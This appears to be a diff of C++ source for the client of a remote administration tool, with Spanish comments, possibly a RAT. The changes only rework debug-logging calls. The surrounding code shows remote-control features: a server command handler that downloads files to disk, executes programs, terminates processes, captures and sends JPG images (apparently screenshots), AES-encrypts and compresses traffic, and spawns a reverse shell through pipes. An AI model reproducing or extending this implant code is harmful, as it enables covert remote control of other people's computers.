@@ -164,12 +164,12 @@ void Cliente::Procesar_Comando(std::vector<char>& cBuffer) {
     if (iComando == EnumComandos::FM_Descargar_Archivo_Init) {
         strIn = strSplit(std::string(cBuffer.data()), CMD_DEL, 3);
         if (strIn.size() == 3) {
-            DebugPrint("[!] Descargando archivo en ruta ", strIn[1], " | size: ", strIn[2]);
+            DebugPrint("[!] Descargando archivo en ruta " + strIn[1], atoi(strIn[2].c_str()));
             if ((this->fpArchivo = fopen(strIn[1].c_str(), "wb")) == nullptr) {
-                DebugPrint("[X] No se pudo abrir el archivo ", strIn[1]);
+                DebugPrint("[X] No se pudo abrir el archivo " + strIn[1]);
             }
         }else {
-            DebugPrint("[X] Error parseando comando: ", cBuffer.data());
+            DebugPrint("[X] Error parseando comando: " + std::string(cBuffer.data()));
         }
         return;
     }
@@ -297,10 +297,10 @@ void Cliente::Procesar_Comando(std::vector<char>& cBuffer) {
             bool isOK = Execute(strIn[1].c_str(), strIn[2] == "1" ? 1 : 0);
 
             if (isOK) {
-                DebugPrint("[!] ", strIn[1], " - ejecutado");
+                DebugPrint("[!] " + strIn[1] + " - ejecutado");
             }
             else {
-                DebugPrint("[X] Error ejecutando ", strIn[1]);
+                DebugPrint("[X] Error ejecutando " + strIn[1]);
             }
         }
         return;
@@ -352,7 +352,7 @@ void Cliente::Procesar_Comando(std::vector<char>& cBuffer) {
         strIn = strSplit(std::string(cBuffer.data()), CMD_DEL, 2);
         if (strIn.size() == 2) {
             if (!EndProcess(atoi(strIn[1].c_str()))) {
-                DebugPrint("[X] No se pudo terminar el PID ", strIn[1]);
+                DebugPrint("[X] No se pudo terminar el PID " + strIn[1]);
             }
         }
         return;
@@ -462,7 +462,7 @@ void Cliente::Procesar_Comando(std::vector<char>& cBuffer) {
                             memcpy(cPacket.data() + iHeaderSize, cJPGBuffer.data(), iJPGBufferSize);
 
                             int iSent = this->cSend(this->sckSocket, reinterpret_cast<const char*>(cPacket.data()), uiPacketSize, 0, true, nullptr);
-                            DebugPrint("[!] ",iSent," bytes sent");
+                            DebugPrint("[!] bytes sent", iSent);
 
                         }
                     }
@@ -740,7 +740,7 @@ void Cliente::iniPacket() {
     
     int iB = cSend(this->sckSocket, strOut.c_str(), strOut.length(), 0, false, nullptr);
     
-    DebugPrint("[INIT]Enviados " ,iB, " bytes");
+    DebugPrint("[INIT]Enviados ", iB);
 }
 
 int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code) {
@@ -775,7 +775,8 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
                     new_Buffer[0] = COMP_HEADER_BYTE_1;
                     std::memcpy(new_Buffer.get() + 2, compData.get(), out_len);
                     iDataSize = out_len + 2; //Cantidad de bytes que fueron comprimidos + cabecera (2 bytes)
-                    DebugPrint("[ZLIB] Success ",iDataSize, " - " ,pLen);
+                    DebugPrint("[ZLIB] Success ", iDataSize);
+                    DebugPrint("......Final: ", pLen);
                 }else {
                     //El buffer compreso es mayor al original, copiar el mismo buffer
                     std::memcpy(new_Buffer.get() + 2, pBuffer, pLen);
@@ -932,7 +933,7 @@ ByteArray Cliente::bEnc(const unsigned char* pInput, size_t pLen) {
     ByteArray bOutput;
     ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
     if (enc_len <= 0) {
-        DebugPrint("Error encriptando " ,pInput);
+        DebugPrint("Error encriptando el buffer");
     }
     return bOutput;
 }
@@ -941,7 +942,7 @@ ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
     ByteArray bOutput;
     ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
     if (dec_len <= 0) {
-        DebugPrint("Error desencriptando " ,pInput);
+        DebugPrint("Error desencriptando");
     }
     return bOutput;
 }
@@ -984,7 +985,7 @@ std::string Cliente::ObtenerDown() {
 //Reverse shell
 
 bool ReverseShell::SpawnShell(const char* pstrComando) {
-    DebugPrint("Lanzando ",pstrComando);
+    DebugPrint("Lanzando " + std::string(pstrComando));
 
     this->stdinRd = this->stdinWr = this->stdoutRd = this->stdoutWr = nullptr;
     SECURITY_ATTRIBUTES sa;
@@ -1112,7 +1113,7 @@ void ReverseShell::thEscribirShell(std::string pStrInput) {
     DWORD dBytesWrited = 0;
     //stdinWr tuberia de entrada
     if (!WriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
-        DebugPrint("Error escribiendo a la tuberia\n-DATA: ",pStrInput);
+        DebugPrint("Error escribiendo a la tuberia\n-DATA: " + pStrInput);
         std::unique_lock<std::mutex> lock(this->mutex_shell);
         this->isRunning = false;
         lock.unlock();
